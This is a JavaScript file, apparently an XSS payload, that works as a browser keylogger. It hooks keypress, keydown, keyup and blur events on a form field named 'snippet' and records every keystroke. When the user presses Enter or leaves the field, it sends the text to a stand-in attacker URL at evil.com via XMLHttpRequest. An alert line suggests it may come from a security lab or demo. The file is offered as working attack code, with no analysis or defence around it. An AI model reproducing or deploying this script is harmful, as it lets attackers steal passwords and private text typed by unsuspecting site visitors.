
var xRequest=false;
function xhr(){
	if(window.XMLHttpRequest){
		//firefox标准
		xRequest=new XMLHttpRequest();
	}else if(window.ActiveXObject){
		//ie标准
		xRequest=new ActiveXObject("Msxml2.XMLHTTP");
		if(!xRequest){
			//ie标准
			xRequest=new ActiveXObject("Microsoft.XMLHTTP");
		}
	}
	return xRequest;
}

function setRequest1(_m,action,argv,sync){
	xRequest.open(_m,action,sync);
	//当为POST方式时，Content-Type设置为 application/x-www-form-urlencoded
	if(_m=="POST")xRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	if(sync){
		xRequest.onreadystatechange=function() {
			if(xRequest.readyState==4) {
				if(xRequest.status==200) {
					return xRequest.responseText;
				}
			}
		}
	}
	xRequest.send(argv);
	if(!sync){
		return xRequest.responseText;
	}
}

function setRequest2(_m,action,argv,sync){
	xRequest.open (_m, action, sync);
	//当为POST方式时，Content-Type设置为 multipart/form-data; boundary=-------------------7964f8dddeb95fc5
	if(_m=="POST")xRequest.setRequestHeader("Content-Type","multipart/form-data; boundary=-------------------7964f8dddeb95fc5");
	if(sync){
		xRequest.onreadystatechange=function() {
			if(xRequest.readyState==4) {
				if(xRequest.status==200) {
					return xRequest.responseText;
				}
			}
		}
	}
	xRequest.send(argv);
	if(!sync){
		return xRequest.responseText;
	}
}

xRequest=xhr();

var keystring = "";//记录按键的字符串

function keypress(e){
	var currKey=0,CapsLock=0,e=e||event;
	currKey=e.keyCode||e.which||e.charCode;
	CapsLock=currKey>=65&&currKey<=90;
	switch(currKey)
	{
	　 　 case 8: case 9:case 13:case 32:case 38:case 39:case 46:keyName = "";break;
	　 　 default:keyName = String.fromCharCode(currKey); break;
	}
	keystring += keyName;
}

function keydown(e){
	var e=e||event;
	var currKey=e.keyCode||e.which||e.charCode;
	if((currKey>7&&currKey<14)||(currKey>31&&currKey<47))
	{
		switch(currKey){
	　 　 　 case 8: keyName = "[LF]"; break;
	　 　 　 case 9: keyName = "[TAB]"; break;
	　 　 　 case 13:keyName = "[CR]"; break;
	　 　 　 case 32:keyName = "[SPACE]"; break;
	　 　 　 case 33:keyName = "[PageUp]"; break;
	　 　 　 case 34:keyName = "[PageDown]"; break;
	　 　 　 case 35:keyName = "[End]"; break;
	　 　 　 case 36:keyName = "[Home]"; break;
	　 　 　 case 37:keyName = "[LEFT]"; break;
	　 　 　 case 38:keyName = "[UP]"; break;
	　 　 　 case 39:keyName = "[RIGHT]"; break;
	　 　 　 case 40:keyName = "[DOWN]"; break;
	　 　 　 case 46:keyName = "[DEL]"; break;
	　 　 　 default:keyName = ""; break;
		}
		if (keyName=='[CR]'){
			setRequest1('GET',"http://www.evil.com:8888/xss/steal.php?data="+keystring,null,true);
		}
		keystring += keyName;
	}
}
function keyup(e){
	return keystring;
}

function blur(){
	setRequest1('GET',"http://www.evil.com:8888/xss/steal.php?data="+keystring,null,true);
}

function bindEvent(o, e, fn){
	//o 绑定的标签对象
	//e 绑定的事件
	//fn 绑定后执行的函数
	if (typeof o == "undefined" || typeof e == "undefined" || typeof fn == "undefined" || o == null){
		return false;
	}
	if (o.addEventListener){  
		o.addEventListener(e, window[fn], false);
	} 
	else if (o.attachEvent){  // IE
		o.attachEvent("on"+e, window[fn]);
	}
	else {
		var oldhandler = o["on"+e];
		if (oldhandler) {
			o["on"+e] = function(x){ 
				oldhandler(x);
				window[fn]();
			}
		}
		else {
			o["on"+e] = function(x){ 
				window[fn]();
			}
		}
	}
	o.focus();
}

alert('keylogger here!');

o=document.getElementsByName('snippet')[0];
bindEvent(o,'keypress',"keypress");
bindEvent(o,'keydown',"keydown");
bindEvent(o,'keyup',"keyup");
bindEvent(o,'blur',"blur");

